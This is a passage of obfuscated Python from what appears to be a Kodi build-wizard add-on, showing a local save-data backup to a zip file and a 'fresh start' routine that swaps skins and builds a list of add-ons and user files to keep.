		loginit .loginIt ('update','all')#line:4450
		debridit .debridIt ('update','all')#line:4451
		O0O0OO00O00O0000O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4452
		O0O0OO00O00O0000O =xbmc .translatePath (O0O0OO00O00O0000O )#line:4453
		O000000OO0O0OOOO0 =os .path .join (OO0OOOO000OOO0O0O ,'SaveData.zip')#line:4454
		OO00OO0000000OOO0 =zipfile .ZipFile (O000000OO0O0OOOO0 ,mode ='w')#line:4455
		for OOO0OOOOOOO0000O0 in OOOOO0OO00000OO00 :#line:4456
			if os .path .exists (OOO0OOOOOOO0000O0 ):#line:4457
				O00OO00O00OOO00OO =os .listdir (OOO0OOOOOOO0000O0 )#line:4458
				for OO00O000OO000O000 in O00OO00O00OOO00OO :#line:4459
					OO00OO0000000OOO0 .write (os .path .join (OOO0OOOOOOO0000O0 ,OO00O000OO000O000 ),os .path .join (OOO0OOOOOOO0000O0 ,OO00O000OO000O000 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4460
		OO00OO0000000OOO0 .close ()#line:4461
		if O0O0OO00O00O0000O ==OO0OOOO000OOO0O0O :#line:4462
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000000OO0O0OOOO0 ))#line:4463
		else :#line:4464
			try :#line:4465
				xbmcvfs .copy (O000000OO0O0OOOO0 ,os .path .join (O0O0OO00O00O0000O ,'SaveData.zip'))#line:4466
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0O0OO00O00O0000O ,'SaveData.zip')))#line:4467
			except :#line:4468
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000000OO0O0OOOO0 ))#line:4469
def freshStart (install =None ,over =False ):#line:4474
	if USERNAME =='':#line:4475
		ADDON .openSettings ()#line:4476
		sys .exit ()#line:4477
	O00OOOO000O0O0O00 =u_list (SPEEDFILE )#line:4478
	(O00OOOO000O0O0O00 )#line:4479
	OOOO0OO00O0OO0OO0 =(wiz .workingURL (O00OOOO000O0O0O00 ))#line:4480
	(OOOO0OO00O0OO0OO0 )#line:4481
	if KEEPTRAKT =='true':#line:4482
		traktit .autoUpdate ('all')#line:4483
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4484
	if KEEPREAL =='true':#line:4485
		debridit .autoUpdate ('all')#line:4486
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4487
	if KEEPLOGIN =='true':#line:4488
		loginit .autoUpdate ('all')#line:4489
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4490
	if over ==True :OOOO0OO0OOOO0O000 =1 #line:4491
	elif install =='restore':OOOO0OO0OOOO0O000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4492
	elif install :OOOO0OO0OOOO0O000 =1 #line:4493
	else :OOOO0OO0OOOO0O000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4494
	if OOOO0OO0OOOO0O000 :#line:4495
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4496
			OO00O0000O00O000O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4497
			skinSwitch .swapSkins (OO00O0000O00O000O )#line:4500
			O00O0O00O000OOOO0 =0 #line:4501
			xbmc .sleep (1000 )#line:4502
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0O00O000OOOO0 <150 :#line:4503
				O00O0O00O000OOOO0 +=1 #line:4504
				xbmc .sleep (1000 )#line:4505
				wiz .ebi ('SendAction(Select)')#line:4506
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4507
				wiz .ebi ('SendClick(11)')#line:4508
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4509
			xbmc .sleep (1000 )#line:4510
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4511
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4512
			return #line:4513
		wiz .addonUpdates ('set')#line:4514
		O0OOOO0OO0O000OO0 =os .path .abspath (HOME )#line:4515
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4516
		O0O0O0O0O0O0O0OOO =sum ([len (OO0OO0O0OO0OO0O00 )for OOOOOO00OOOOO000O ,O00OOOO00O0OO000O ,OO0OO0O0OO0OO0O00 in os .walk (O0OOOO0OO0O000OO0 )]);O00000OOOOO0O000O =0 #line:4517
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4518
		EXCLUDES .append ('My_Builds')#line:4519
		EXCLUDES .append ('archive_cache')#line:4520
		EXCLUDES .append ('script.module.requests')#line:4521
		EXCLUDES .append ('myfav.anon')#line:4522
		if KEEPREPOS =='true':#line:4523
			OO0O00OO0O00000O0 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4524
			for OOOO0OO0000000OO0 in OO0O00OO0O00000O0 :#line:4525
				O000OOOOOO0OOO00O =os .path .split (OOOO0OO0000000OO0 [:-1 ])[1 ]#line:4526
				if not O000OOOOOO0OOO00O ==EXCLUDES :#line:4527
					EXCLUDES .append (O000OOOOOO0OOO00O )#line:4528
		if KEEPSUPER =='true':#line:4529
			EXCLUDES .append ('plugin.program.super.favourites')#line:4530
		if KEEPMOVIELIST =='true':#line:4531
			EXCLUDES .append ('plugin.video.metalliq')#line:4532
		if KEEPMOVIELIST =='true':#line:4533
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4534
		if KEEPADDONS =='true':#line:4535
			EXCLUDES .append ('addons')#line:4536
		if KEEPADDONS =='true':#line:4537
			EXCLUDES .append ('addon_data')#line:4538
		EXCLUDES .append ('plugin.video.elementum')#line:4541
		EXCLUDES .append ('script.elementum.burst')#line:4542
		EXCLUDES .append ('script.elementum.burst-master')#line:4543
		EXCLUDES .append ('plugin.video.quasar')#line:4544
		EXCLUDES .append ('script.quasar.burst')#line:4545
		EXCLUDES .append ('skin.estuary')#line:4546
		if KEEPWHITELIST =='true':#line:4549
			O000OO00OOO0O00O0 =''#line:4550
			O0OO00O0O0OOOO00O =wiz .whiteList ('read')#line:4551
			if len (O0OO00O0O0OOOO00O )>0 :#line:4552
				for OOOO0OO0000000OO0 in O0OO00O0O0OOOO00O :#line:4553
					try :OOOOO00OOOO0OOO0O ,O0OOOOOOOO0000OO0 ,OO0O00OO000O0OOOO =OOOO0OO0000000OO0 #line:4554
					except :pass #line:4555
					if OO0O00OO000O0OOOO .startswith ('pvr'):O000OO00OOO0O00O0 =O0OOOOOOOO0000OO0 #line:4556
					OOOOOO0O0O0O00OOO =dependsList (OO0O00OO000O0OOOO )#line:4557
					for OO0OO0OO00O0000OO in OOOOOO0O0O0O00OOO :#line:4558
						if not OO0OO0OO00O0000OO in EXCLUDES :#line:4559
							EXCLUDES .append (OO0OO0OO00O0000OO )#line:4560
						O00O00OO00O0O00O0 =dependsList (OO0OO0OO00O0000OO )#line:4561
						for O0OOOO00OOOOOO0O0 in O00O00OO00O0O00O0 :#line:4562
							if not O0OOOO00OOOOOO0O0 in EXCLUDES :#line:4563
								EXCLUDES .append (O0OOOO00OOOOOO0O0 )#line:4564
					if not OO0O00OO000O0OOOO in EXCLUDES :#line:4565
						EXCLUDES .append (OO0O00OO000O0OOOO )#line:4566
				if not O000OO00OOO0O00O0 =='':wiz .setS ('pvrclient',OO0O00OO000O0OOOO )#line:4567
		if wiz .getS ('pvrclient')=='':#line:4568
			for OOOO0OO0000000OO0 in EXCLUDES :#line:4569
				if OOOO0OO0000000OO0 .startswith ('pvr'):#line:4570
					wiz .setS ('pvrclient',OOOO0OO0000000OO0 )#line:4571
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4572
		OOO0O0O0O0000000O =wiz .latestDB ('Addons')#line:4573
		for O0OOO00O0OOOOOO00 ,OO0OOOOO00OO0O000 ,OO0OOO0000OO0O000 in os .walk (O0OOOO0OO0O000OO0 ,topdown =True ):#line:4574
			OO0OOOOO00OO0O000 [:]=[O00O000OOO0OO0O00 for O00O000OOO0OO0O00 in OO0OOOOO00OO0O000 if O00O000OOO0OO0O00 not in EXCLUDES ]#line:4575
			for OOOOO00OOOO0OOO0O in OO0OOO0000OO0O000 :#line:4576
				O00000OOOOO0O000O +=1 #line:4577
				OO0O00OO000O0OOOO =O0OOO00O0OOOOOO00 .replace ('/','\\').split ('\\')#line:4578
				O00O0O00O000OOOO0 =len (OO0O00OO000O0OOOO )-1 #line:4580
				if OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4581
				elif OOOOO00OOOO0OOO0O =='MyVideos99.db'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4582
				elif OOOOO00OOOO0OOO0O =='MyVideos107.db'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4583
				elif OOOOO00OOOO0OOO0O =='MyVideos116.db'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4584
				elif OOOOO00OOOO0OOO0O =='MyVideos99.db'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4585
				elif OOOOO00OOOO0OOO0O =='MyVideos107.db'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4586
				elif OOOOO00OOOO0OOO0O =='MyVideos116.db'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4587
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4588
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'skin.anonymous.mod'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4589
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'skin.Premium.mod'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4590
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'skin.anonymous.nox'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4591
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'skin.phenomenal'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4592
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'plugin.video.metalliq'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4593
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'skin.titan'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4595
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'pvr.iptvsimple'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4596
				elif OOOOO00OOOO0OOO0O =='sources.xml'and OO0O00OO000O0OOOO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4598
				elif OOOOO00OOOO0OOO0O =='quicknav.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4601
				elif OOOOO00OOOO0OOO0O =='x1101.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4602
				elif OOOOO00OOOO0OOO0O =='b-srtym-b.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4603
				elif OOOOO00OOOO0OOO0O =='x1102.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4604
				elif OOOOO00OOOO0OOO0O =='b-sdrvt-b.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4605
				elif OOOOO00OOOO0OOO0O =='x1112.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4606
				elif OOOOO00OOOO0OOO0O =='b-tlvvyzyh-b.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4607
				elif OOOOO00OOOO0OOO0O =='x1111.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4608
				elif OOOOO00OOOO0OOO0O =='b-tvknyshrly-b.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4609
				elif OOOOO00OOOO0OOO0O =='x1110.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4610
				elif OOOOO00OOOO0OOO0O =='b-yldym-b.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4611
				elif OOOOO00OOOO0OOO0O =='x1114.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4612
				elif OOOOO00OOOO0OOO0O =='b-mvzyqh-b.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4613
				elif OOOOO00OOOO0OOO0O =='mainmenu.DATA.xml'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4614
				elif OOOOO00OOOO0OOO0O =='skin.Premium.mod.properties'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4615
				elif OOOOO00OOOO0OOO0O =='favourites.xml'and OO0O00OO000O0OOOO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4619
				elif OOOOO00OOOO0OOO0O =='guisettings.xml'and OO0O00OO000O0OOOO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4621
				elif OOOOO00OOOO0OOO0O =='profiles.xml'and OO0O00OO000O0OOOO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4622
				elif OOOOO00OOOO0OOO0O =='advancedsettings.xml'and OO0O00OO000O0OOOO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4623
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4624
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'program.apollo'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4625
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4626
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'plugin.video.elementum'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4629
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4630
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4631
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'plugin.video.quasar'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4633
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'program.apollo'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4634
				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4635
